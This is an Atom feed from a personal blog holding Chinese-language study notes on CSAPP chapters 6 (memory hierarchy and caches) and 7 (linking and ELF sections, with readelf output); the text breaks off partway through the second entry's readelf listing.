<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Amiriox&#39;s Storage</title>
  <icon>https://amiriox.github.io/images/favicon.ico</icon>
  <subtitle>Declaration does not declare anything.</subtitle>
  <link href="https://amiriox.github.io/atom.xml" rel="self"/>
  
  <link href="https://amiriox.github.io/"/>
  <updated>2025-02-20T16:48:53.297Z</updated>
  <id>https://amiriox.github.io/</id>
  
  <author>
    <name>amiriox</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSAPP3e第六章(存储器层次结构)</title>
    <link href="https://amiriox.github.io/2025/02/20/CSAPP-2025-02-20/"/>
    <id>https://amiriox.github.io/2025/02/20/CSAPP-2025-02-20/</id>
    <published>2025-02-20T14:04:30.910Z</published>
    <updated>2025-02-20T16:48:53.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第六章-存储器层次结构摘要与注解">第六章存储器层次结构(摘要与注解)</h1><p>这一章也很好理解, 重点解释一些不太好理解或者书上介绍不是很清楚的地方,然后列大纲用于以后复习看。</p><h2 id="存储器分类">存储器分类</h2><p>当前存储技术主要可以做以下分类:</p><ol type="1"><li>RAM 随机访问储存器, 断电后数据会消失<ol type="1"><li>SRAM, 静态随机范围储存器, 例如 CPU 的 <code>L1/L2/L3</code> 缓存,每个单元是六晶体管电路</li><li>DRAM, 动态随机范围存储器,每个单元是一晶体管电路。我们常用的主存一般是双倍数据速率同步的 DRAM(Double Data-Rate DRAM), 这是 DDR 内存的实际传输情况一般要频率乘 2(有的会用 MT/s 作单位, 除以 2 就是频率)</li></ol></li><li>ROM, 名字不重要, 一般可以读也可以写, 非易失性的<ol type="1"><li>PROM, 可编程 ROM, 只能被编程一次</li><li>EPROM, 可擦写可编程 ROM</li><li>EEPROM, 电子可擦写可编程 ROM, 一般每个单元会在编程 <spanclass="math inline">\(10^5\)</span> 次后失效</li><li>闪存, 基于 EEPROM, 我们用的固态硬盘中的颗粒就是这个</li></ol></li><li>旋转磁盘</li></ol><h2 id="dram-中的数据访问">DRAM 中的数据访问</h2><p>一个传统 DRAM 芯片中分为 <span class="math inline">\(d=r \timesc\)</span> 个<strong>超单元</strong>, 每个超单元由 <spanclass="math inline">\(w\)</span> 个 DRAM 单元组成(即 <spanclass="math inline">\(w\)</span> 位信息)</p><p>每个 DRAM 芯片都连接到内存控制器芯片, 读 <spanclass="math inline">\((r, c)\)</span> 时会把第 <spanclass="math inline">\(r\)</span> 行全部放入内部行缓冲区,然后取这一行的第 <span class="math inline">\(c\)</span> 列。</p><p>多个 DRAM 芯片封装到<strong>内存模块</strong>中。一个 <spanclass="math inline">\(64\)</span> 位字被分割为几个部分存储到不同 DRAM芯片中, 要读取某个地址的主存内容,内存控制器会先将这个地址转换为超单元地址 <span class="math inline">\((r,c)\)</span> 然后广播到所有 DRAM 芯片最终合成为一个整体。</p><h2 id="旋转磁盘">旋转磁盘</h2><ul><li>盘面-&gt;磁道-&gt;扇区的概念</li><li>柱面的概念</li><li>为了各个磁道扇区数相对相同, 因此有了记录区的概念</li><li>逻辑块(可能是硬件或固件)和磁盘控制器的概念</li><li>旋转磁盘的读取时间分为三部分<ol type="1"><li>寻道时间</li><li>旋转时间(近似等于寻道时间)</li><li>传送时间(和前两者相比可忽略)</li></ol></li></ul><h2 id="固态硬盘ssd">固态硬盘(SSD)</h2><p>由闪存芯片(主控芯片)、闪存翻译层(类似磁盘控制器)和闪存颗粒构成,闪存颗粒包含多个块, 每个块包含多个页</p><p>数据是以页单位读写的, 另外 SSD 读比写快。</p><p>基于闪存, 闪存基于 EEPROM, 所以这玩意每个块也是 <spanclass="math inline">\(10^5\)</span>次擦写后失效。但是现代很多平均磨损处理逻辑处理得很好,用户不太需要担心这个问题。</p><h2 id="计算机体系中的各部分数据交流">计算机体系中的各部分数据交流</h2><p>各部分之间通信一般是通过<strong>总线(bus)</strong>中传递数据流。我们常说的 PCI, PCIe 就是总线标准, USB 是通用串行总线的缩写。</p><h3 id="主存到cpu">主存到CPU</h3><p>CPU 有总线接口,通过<strong>系统总线</strong>连接到<strong>I/O桥</strong>(很多修笔记本的弹幕里常常说的先干南桥的南桥就是I/O桥),I/O桥通过<strong>内存总线</strong>连接到主存。</p><p><em>寄存器的数据传递到主存(store)和主存的数据传递到寄存器(load)都需要两次总线事务+一次额外操作, 可以回想一下。</em></p><h3 id="cpu-向旋转磁盘或其他io设备发送指令">CPU向旋转磁盘(或其他I/O设备)发送指令</h3><p>磁盘通过总线适配器(SCSI/SATA/NVMe)连接到<strong>I/O总线</strong>,I/O总线连接到I/O桥, 剩下就还是I/O桥通过系统总线与 CPU 链接。</p><p>CPU 通过<strong>内存映射I/O(Memory Mapped I/O)</strong> 向 I/O设备发送指令。地址空间内有一块地址(称为 I/O Port,个人觉得这个叫法很蠢)专门为与 I/O 设备通信保留的(一个设备可能映射到多个I/O Port)。</p><p>CPU 通过总线向磁盘控制器发送 <span class="math inline">\((指令, src:逻辑块, dest: 主存某地址)\)</span>, 然后 CPU 不会等待 I/O (因为很慢,这个间隔有约 <span class="math inline">\(16ms/clock\)</span>次时钟周期), 由磁盘控制器读完数据后直接通过总线传送给主存(这个过程称作<strong>Direct Memory Access, DMA</strong>),然后传送完成时磁盘控制器通过 <strong>中断(Interrupt)</strong> 提示并打断CPU 通知其数据已到达。</p><blockquote><p>之前看到过一个视频说某个网吧有个 DMA 包间, 我第一反应就是这个DMA<br />结果还真是这个 DMA, 通过 DMA 技术读主存,在另一台设备上进行游戏作弊<br />只能说真想不到技术还能这么用</p><p>学操作系统或者组成原理继续往后学(异常控制流那里)还会介绍 Interrupt和另一种控制流 Trap 的机制, 个人觉得这里挺好玩的。</p></blockquote><h2 id="存储器体系解构的设计理念">存储器体系解构的设计理念</h2><h3 id="程序的局部性原理">程序的局部性原理</h3><ul><li>时间局部性: 一个位置的数据在一个时间范围内被多次访问</li><li>空间局部性: 一个时间范围内访问相邻的多个位置的数据</li></ul><p>书中以不同步长的循环对比, 分析了不命中率 并比较其效率</p><p>简单来说,如果对某个位置的访问的最近上一层循环的下标和这个位置的访问下标一致,那么显而易见这部分肯定是步长为 1 的循环, 步长为 <spanclass="math inline">\(k\)</span>, 高速缓存块大小为 <spanclass="math inline">\(B\)</span> 字节, 不命中率为 <spanclass="math inline">\(min(1, wordsize \times k / B)\)</span>,模拟以下就懂了, 实际上就是缓存只有 <spanclass="math inline">\(B\)</span>字节不够用了导致的<strong>容量不命中</strong>(这里我为了连续性调整了原书介绍的顺序,缓存命中的概念在下面说)</p><p>编写缓存友好的代码需要我们:</p><ul><li>对局部变量的反复引用(编译器可以缓存到寄存器)</li><li>多重视循环的局部性(其实时间复杂度也是主要看循环(或递归))</li><li>步长为 <span class="math inline">\(1\)</span> 的引用模式是好的</li></ul><h3 id="缓存">缓存</h3><p>基于局部性原理,很自然地就有缓存的概念了。既然我们知道某个数据可能被多次引用/某一个部分的数据可能连续引用,那么我们只要把大块存储中的这一小块常常被引用的部分放到较快(也较贵较小)的存储器中就能以低成本很大程度上提升存取效率,这就是缓存的概念。</p><p>下面我们来看计算机中真实的缓存是如何实现的。</p><p>我们在<ahref="%5BCSAPP-2025-01-19%20%7C%20Amiriox&#39;s%20Storage%5D(https://amiriox.github.io/2025/01/19/CSAPP-2025-01-19/#more)">第二章的博客</a>中用设计师的视角,以目的论为工具自然地理解了补码的意义和原理,这里我们同样用设计师的视角来看:</p><p>首先, 缓存肯定是把地址空间内某个地址的数据缓存到 cache 里的某个位置,那么我们首先要面对的问题就是: 放到哪个位置?<br />由于我们只是把一部分的数据拿出来缓存起来(其实虚拟内存是全相联缓存,博客写到第九章时会说), 所以读一个数据时肯定可能出现读不到的情况,称为”缓存不命中”, 我们把可能出现的三种不命中类型分别命名为:</p><ol type="1"><li>强制不命中/冷不命中: 缓存是空的, 自然读不到数据</li><li>冲突不命中: 这个位置上有其他的数据了, 不是我要的数据,自然不能读</li><li>容量不命中: 缓存太小, 当前工作集太大</li></ol><p>从上面的三种情况, 我们意识到一些事:</p><ul><li>由于缓存一定是小于等于其缓存的内容的存储器大小(也就是下面存储器层次结构中较下层的存储器)的,而原则上我们又要让”任何一个地址的数据都可以进缓存(毕竟你不能预测哪些地址具有优秀的性质)“,所以我们需要给某一段地址分为一组,这些地址都缓存到同一个位置然后给每个位置编上<strong>索引(Index)</strong>,所以出现了冲突不命中</li><li>由于会冲突不命中,为了辨别这个缓存位置当前存的是这个分组内的哪个地址,我们需要还需要根据这组地址的唯一特征作一个<strong>标记(Tag)</strong>,然后根据缓存中这个组当前的标记来看是当前存的是哪个地址</li><li>当然, 缓存本身也需要空间,我们通过缓存的另一个唯一特征(并且是要求连续的特征)作为偏移量,来区分同一组内的多个字节是哪个地址的缓存</li></ul><p>还是第二章说过的那句话, 由于我们实际上不是设计师,所以在经过一些思考后可以直接看答案。</p><p>首先是地址分组的索引和唯一标记<spanclass="math inline">\(^{[*]}\)</span>, 以 <code>0x12345678</code> 为例,这个地址的二进制值是<code>10010001101000101011001111000</code>:</p><table><thead><tr><th style="text-align: center;">标记(前 <spanclass="math inline">\(t\)</span> 位)</th><th style="text-align: center;">组索引(中间 <spanclass="math inline">\(s\)</span> 位)</th><th style="text-align: center;">块偏移(结尾 <spanclass="math inline">\(b\)</span> 位)</th></tr></thead><tbody><tr><td style="text-align: center;"><code>10010001</code></td><td style="text-align: center;"><code>10100010101</code></td><td style="text-align: center;"><code>1001111000</code></td></tr></tbody></table><p>这样 <code>0x12345678</code> 就是索引为<code>10100010101 = 1301</code> 的组, 带有<code>10010001</code>标记的那一行, 偏移为 <code>1001111000 = 632</code>同时我们也意识到, 标记为 <span class="math inline">\(t\)</span> 位,索引为 <span class="math inline">\(s\)</span> 位, 块偏移 <spanclass="math inline">\(b\)</span> 位的 <span class="math inline">\(t + s+ b\)</span> 位地址需要 <span class="math inline">\(S = 2^s\)</span> 组,每组(理想上)需要 <span class="math inline">\(E = 2^t\)</span> 行, 能够存<span class="math inline">\(B = 2^b\)</span> 个地址的缓存, 一共能存储 $C = S E B$ 个地址, 这里 <span class="math inline">\(C = 2^{64} =2^{t+s+b}\)</span>, 恰好容纳了所有的地址.</p><p>当然一般缓存容量都不足以不冲突地容纳所有地址,这主要表现在大部分缓存不会是 <span class="math inline">\(E =2^t\)</span> 行。<br />我们以每组的行数 <span class="math inline">\(E\)</span>作为因素分类:</p><ul><li>直接映射高速缓存, <span class="math inline">\(E = 1\)</span>,狠狠冲突, 但是很简单</li><li>组相联高速缓存, <span class="math inline">\(1 &lt; E &lt; C/B, S =\frac{C}{E \times B}\)</span></li><li>全相联高速缓存, <span class="math inline">\(E = C/B, S = 1\)</span>,所有的地址都能容纳, 上面的例子就是全相联</li></ul><p>这样我们通过对地址的分类也得出了组织高速缓存本身的方法:</p><figure><img src="../images/image-20250221001408021.png"alt="image-20250221001408021" /><figcaption aria-hidden="true">image-20250221001408021</figcaption></figure><p>在查找一个地址的缓存时, 通过中间 <spanclass="math inline">\(s\)</span> 位组索引找到属于哪个组, 再通过中间<span class="math inline">\(t\)</span>位标记找到属于哪个行(如果没有就是冲突不命中了),然后根据块偏移找到具体是哪个块(这里补充一下,注意每个块存的是一个字节)</p><h4 id="冲突不命中时的替换策略">冲突不命中时的替换策略</h4><ul><li>直接映射高速缓存直接替换</li><li>组相联高速缓存有多种替换策略, 如<ul><li><code>LRU</code>(Least Recently Used),替换一段时间内最后一次访问时间最久远的那一行</li><li><code>LFU</code> (Least Frequently Used),替换一段时间内最不常访问的一行</li></ul></li><li>如果你还在想全相联高速缓存的替换策略, 说明你白学了。不过也没关系,罚你重看上面的。</li><li>这里书中提了下全相联高速缓存会用在虚拟内存映射系统的 TLB,算是提前剧透一下后面的内容</li></ul><h4 id="写入数据">写入数据</h4><p>以上重点讲了读某个地址时找其对应缓存的策略,但其实写入数据也不(不一定)是直接写入主存(除非是下面要说的非写分配),而也是先进入缓存的.<br />常见的策略有:</p><ul><li>Write-through 直写, 直接把写入缓存的内容同步更新写入主存,缺陷是每次直写都会引起总线流量</li><li>Write-back 写回, 由于我们读地址的数据是先找缓存,所以其实没什么必要保持主存一直是最新的数据,但当一个缓存行被替换掉时就必须得更新主存了,因为此时缓存里被替换掉的数据已经不存在了。这种被替换时才写回主存的叫这个名儿。</li></ul><h4 id="写不命中">写不命中</h4><p>写入数据先进缓存, 但缓存里没缓存到这个数据怎么办?(妈的这里特有的名词动词是一个词)</p><ul><li>Write-allocate: 加载我们要写的数据所在的这一整块进高速缓存,然后根据上面的策略更新缓存, 试图利用局部性原理, 但缺陷和直写一样</li><li>No-Write-allocate: 不管缓存, 直接写入主存</li></ul><h4 id="其他">其他</h4><p>L1 缓存由于有着接近寄存器文件的速度, 所以不仅有储存数据的<code>d-cache</code>, 还有储存指令的 <code>i-cache</code> (d = data, i =instruction), 这个 i-cache 的事之前在 <code>rCore Camp</code>的秋令营接触过一点 (这里原则上不应该加引用, 但是 Typora经常恕我拼写有问题, 懒得一个个加词典)</p><p>这些已经在保持正确性和完整性的情况下基本概括并且有逻辑地解释了原书这部分的内容了,除了有关 6.4.7 高速缓存参数 的性能影响这一节,因为太好理解了就不作解释了</p><p>另外就是你看你学了这么多, 其实按原书的话说只学了缓存的皮毛,<del>绝望吗</del><br />其实组成原理这一整门课都是在学皮毛(), 毕竟这门课叫 <code>ICS</code>(Introduction of Computer Science),<br />btw, 北大的那门 <code>ICS</code> 也是买的这门课(还是这本书来着)的版权,Lab 也是 15213 的 Lab 改的<br />笔者在写这篇文章的时候记得几个月前北大的 <code>ICS</code>课期末考试因为计算上无用地复杂在知乎上起节奏了 (<br /><del>我就是因为这个所以没去北大(大雾</del></p><h3 id="存储器层次结构">存储器层次结构</h3><p>观察各种存储器的发展速度,我们发现一定程度上存储器的速度可能会制约到芯片的效率,成为计算机运算能力的瓶颈。加上较快的存储设备也一般比较昂贵,所以我们发展了存储层次结构的概念:</p><figure><img src="../images/image-20250220232537093.png"alt="image-20250220232537093" /><figcaption aria-hidden="true">image-20250220232537093</figcaption></figure><p>其实我们在下一章学到地址空间与虚拟内存就会发现,其实这里每一层都是对其下一层的缓存。</p><p>通过局部性原理和这样的一层缓存一层的层次结构,我们有效提升了存储器对解决实际问题的效率,使其不再成为制约芯片算力的瓶颈。</p><p>至于瓶颈这个事可以类比现在的显示芯片和屏幕, 现在<code>2K/2.5K/4K/8K</code> 的屏幕迅猛发展,但是现在顶级的显示处理器也无法带动 4K 下较为流畅的游戏运行,一定程度上制约了屏幕的发展。<del>然后 NVIDIA 和游戏厂商还在 DLSS这种邪路上越走越远</del></p><h3 id="存储器山">存储器山</h3><p>本书封面图, 用以直观展现高速缓存对程序性能的影响。</p><ul><li>随着步长增大, 程序的空间局部性越来越差,整体展现为一个平滑的斜坡。</li><li>随着数据大小的增大, 较小的(也是较高速的)缓存不能再容下整个数据块,程序的时间局部性变差,到一定大小后会缓存到存储层次结构中较低层(较慢)的缓存,数据所以显示为一个平台一个平台往下掉</li><li>还有更多有趣的细节在书中有提</li></ul><p>个人对这种数据可视化的浪漫其实无感, 但这张图例外, 确实很漂亮,也很清晰。</p><figure><img src="../images/image-20250220231904694.png"alt="image-20250220231904694" /><figcaption aria-hidden="true">image-20250220231904694</figcaption></figure><p>这篇文章从 <code>‏‎22:04:30</code> 写到了 <code>0:45:07</code>,虽然写的时候还没放赞助二维码,但是如果你读到这的时候发现已经放了二维码能不能扫一杯咖啡钱(,现在大一急需零花钱捏QAQ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;第六章-存储器层次结构摘要与注解&quot;&gt;第六章
存储器层次结构(摘要与注解)&lt;/h1&gt;
&lt;p&gt;这一章也很好理解, 重点解释一些不太好理解或者书上介绍不是很清楚的地方,
然后列大纲用于以后复习看。&lt;/p&gt;
&lt;h2 id=&quot;存储器分类&quot;&gt;存储器分类&lt;/h2&gt;
&lt;p&gt;当前存储技术主要可以做以下分类:&lt;/p&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;RAM 随机访问储存器, 断电后数据会消失
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;SRAM, 静态随机范围储存器, 例如 CPU 的 &lt;code&gt;L1/L2/L3&lt;/code&gt; 缓存,
每个单元是六晶体管电路&lt;/li&gt;
&lt;li&gt;DRAM, 动态随机范围存储器,
每个单元是一晶体管电路。我们常用的主存一般是双倍数据速率同步的 DRAM
(Double Data-Rate DRAM), 这是 DDR 内存的实际传输情况一般要频率乘 2
(有的会用 MT/s 作单位, 除以 2 就是频率)&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;ROM, 名字不重要, 一般可以读也可以写, 非易失性的
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;PROM, 可编程 ROM, 只能被编程一次&lt;/li&gt;
&lt;li&gt;EPROM, 可擦写可编程 ROM&lt;/li&gt;
&lt;li&gt;EEPROM, 电子可擦写可编程 ROM, 一般每个单元会在编程 &lt;span class=&quot;math inline&quot;&gt;&#92;(10^5&#92;)&lt;/span&gt; 次后失效&lt;/li&gt;
&lt;li&gt;闪存, 基于 EEPROM, 我们用的固态硬盘中的颗粒就是这个&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;旋转磁盘&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
    <category term="CSAPP/cmu15213" scheme="https://amiriox.github.io/tags/CSAPP-cmu15213/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP3e第七章(链接)</title>
    <link href="https://amiriox.github.io/2025/02/19/CSAPP-2025-02-19/"/>
    <id>https://amiriox.github.io/2025/02/19/CSAPP-2025-02-19/</id>
    <published>2025-02-19T08:28:39.000Z</published>
    <updated>2025-02-20T15:39:35.315Z</updated>
    
    <content type="html"><![CDATA[<h1 id="链接第七章-all">链接(第七章 ALL)</h1><p>这章内容很短, 就是书中和 15213 都有意隐去了很多细节,自己去理解思考这些细节会很麻烦</p><p>另外 section 的翻译易引起歧义, 这里不作翻译</p><h2 id="静态链接">静态链接:</h2><p>静态链接包括两个阶段, 符号解析和重定位:</p><h3 id="符号解析">符号解析</h3><p>符号解析是要把每一个符号引用与符号定义联系起来</p><p>首先要理解可重定向文件的各个 section</p><table style="width:100%;"><colgroup><col style="width: 12%" /><col style="width: 46%" /><col style="width: 41%" /></colgroup><thead><tr><th style="text-align: center;">名称</th><th style="text-align: center;">意义</th><th style="text-align: center;">举例</th></tr></thead><tbody><tr><td style="text-align: center;">ELF Header</td><td style="text-align: center;">描述 ELF 格式文件的各个 Section信息</td><td style="text-align: center;">开始 16字节描述了生成该文件的系统的大小和字节顺序,剩下的描述目标文件类型/机器类型等</td></tr><tr><td style="text-align: center;"><code>.text</code></td><td style="text-align: center;">代码段, 已编译程序的机器代码</td><tdstyle="text-align: center;"><code>E8 78 56 34 12</code> (<code>callq 0x12345678</code>)</td></tr><tr><td style="text-align: center;"><code>.rodata</code></td><td style="text-align: center;">只读数据</td><td style="text-align: center;"><code>printf("%d", a)</code> 中的<code>"%d"</code>, switch 的跳转表</td></tr><tr><td style="text-align: center;"><code>.data</code></td><td style="text-align: center;">已初始化的全局和静态变量</td><td style="text-align: center;"></td></tr><tr><td style="text-align: center;"><code>.bss</code>*</td><td style="text-align: center;">未初始化的或初始化为 0的全局和静态变量</td><tdstyle="text-align: center;"><code>static int bss = 0; int arr[N]; signed main() &#123;&#125;</code></td></tr><tr><td style="text-align: center;"><code>.symtab</code></td><td style="text-align: center;">符号表, 定义和引用的符号信息</td><td style="text-align: center;">任意符号</td></tr><tr><td style="text-align: center;"><code>.rel.text</code></td><td style="text-align: center;">代码段符号的重定位条目(见下文)</td><td style="text-align: center;"><code>void func();</code> 中<code>R_X86_64_PC32 func</code></td></tr><tr><td style="text-align: center;"><code>.rel.data</code></td><td style="text-align: center;">数据段符号的重定位条目(见下文)</td><td style="text-align: center;"><code>int arr[N];</code> 中<code>R_X86_64_32 arr</code></td></tr><tr><td style="text-align: center;"><code>.debug</code></td><td style="text-align: center;"><code>-g</code>, 原始 C 文件</td><td style="text-align: center;">N/A</td></tr><tr><td style="text-align: center;"><code>.line</code></td><td style="text-align: center;">行号映射</td><td style="text-align: center;">N/A</td></tr><tr><td style="text-align: center;"><code>.strtab</code></td><td style="text-align: center;"><code>.symtab</code> 和<code>.debug</code> 中的符号表, Section Header 中的 section 名字</td><td style="text-align: center;">N/A</td></tr><tr><td style="text-align: center;">Section Header</td><td style="text-align: center;">描述目标文件的 section</td><td style="text-align: center;">N/A</td></tr></tbody></table><p>这里拿具体的例子展示一下, 环境是 x86_64 Linux, 使用<code>readelf</code> 读 ELF 文件, 删去了一些不重要的输出,中文为注释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> bss;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">1024</span>];</span><br><span class="line"><span class="type">int</span> dx[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c -static test.c -o elf.out</span><br><span class="line">$ readelf -a elf.out</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">    前 16 字节描述的生成该文件的系统信息</span><br><span class="line">  Class:                             ELF64</span><br><span class="line">    ELF 类别</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">    补码, 小端法(第二章)</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">    系统类型和 ABI</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              REL (Relocatable file)</span></span><br><span class="line"><span class="string">    可重定位目标文件</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x0</span></span><br><span class="line"><span class="string">  Start of program headers:          0 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          664 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           0 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         0</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         13</span></span><br><span class="line"><span class="string">  Section header string table index: 12</span></span><br><span class="line"><span class="string">    描述各个 section 的起始/大小信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Section Headers:</span></span><br><span class="line"><span class="string">  [Nr] Name              Type             Address           Offset</span></span><br><span class="line"><span class="string">       Size              EntSize          Flags  Link  Info  Align</span></span><br><span class="line"><span class="string">  [ 0]                   NULL             0000000000000000  00000000</span></span><br><span class="line"><span class="string">       0000000000000000  0000000000000000           0     0     0</span></span><br><span class="line"><span class="string">  [ 1] .text             PROGBITS         0000000000000000  00000040</span></span><br><span class="line"><span class="string">       0000000000000011  0000000000000000  AX       0     0     1</span></span><br><span class="line"><span class="string">  [ 2] .rela.text        RELA             0000000000000000  000001f8</span></span><br><span class="line"><span class="string">       0000000000000018  0000000000000018   I      10     1     8</span></span><br><span class="line"><span class="string">  [ 3] .data             PROGBITS         0000000000000000  00000060</span></span><br><span class="line"><span class="string">       0000000000000010  0000000000000000  WA       0     0     16</span></span><br><span class="line"><span class="string">  [ 4] .bss              NOBITS           0000000000000000  00000080</span></span><br><span class="line"><span class="string">       0000000000001004  0000000000000000  WA       0     0     32</span></span><br><span class="line"><span class="string">    [ 5] [ 6] [ 7] [ 8] [ 9] 删去</span></span><br><span class="line"><span class="string">  [10] .symtab           SYMTAB           0000000000000000  00000118</span></span><br><span class="line"><span class="string">       00000000000000c0  0000000000000018          11     4     8</span></span><br><span class="line"><span class="string">  [11] .strtab           STRTAB           0000000000000000  000001d8</span></span><br><span class="line"><span class="string">       000000000000001c  0000000000000000           0     0     1</span></span><br><span class="line"><span class="string">  [12] .shstrtab         STRTAB           0000000000000000  00000228</span></span><br><span class="line"><span class="string">       000000000000006c  0000000000000000           0     0     1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Relocation section &#x27;</span>.rela.text<span class="string">&#x27; at offset 0x1f8 contains 1 entry:</span></span><br><span class="line"><span class="string">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span></span><br><span class="line"><span class="string">00000000000a  000500000004 R_X86_64_PLT32    0000000000000000 func - 4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Relocation section &#x27;</span>.rela.eh_frame<span class="string">&#x27; at offset 0x210 contains 1 entry:</span></span><br><span class="line"><span class="string">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span></span><br><span class="line"><span class="string">000000000020  000200000002 R_X86_64_PC32     0000000000000000 .text + 0</span></span><br><span class="line"><span class="string">No processor specific unwind information to decode</span></span><br><span class="line"><span class="string">    重定向条目</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Symbol table &#x27;</span>.symtab<span class="string">&#x27; contains 8 entries:</span></span><br><span class="line"><span class="string">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span></span><br><span class="line"><span class="string">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND</span></span><br><span class="line"><span class="string">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS test.c</span></span><br><span class="line"><span class="string">     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 .text</span></span><br><span class="line"><span class="string">     3: 0000000000001000     4 OBJECT  LOCAL  DEFAULT    4 bss</span></span><br><span class="line"><span class="string">     4: 0000000000000000    17 FUNC    GLOBAL DEFAULT    1 foo</span></span><br><span class="line"><span class="string">     5: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND func</span></span><br><span class="line"><span class="string">     6: 0000000000000000  4096 OBJECT  GLOBAL DEFAULT    4 arr</span></span><br><span class="line"><span class="string">     7: 0000000000000000    16 OBJECT  GLOBAL DEFAULT    3 dx</span></span><br><span class="line"><span class="string">    这里的 UND, ABS 下面会说到</span></span><br><span class="line"><span class="string">      Properties: x86 ISA used:</span></span><br><span class="line"><span class="string">        x86 feature used: x86</span></span><br><span class="line"><span class="string">$ readelf -x .text elf.out</span></span><br><span class="line"><span class="string">Hex dump of section &#x27;</span>.text<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">  0x00000000 554889e5 b8000000 00e80000 0000905d UH.............]</span></span><br><span class="line"><span class="string">  0x00000010 c3</span></span><br><span 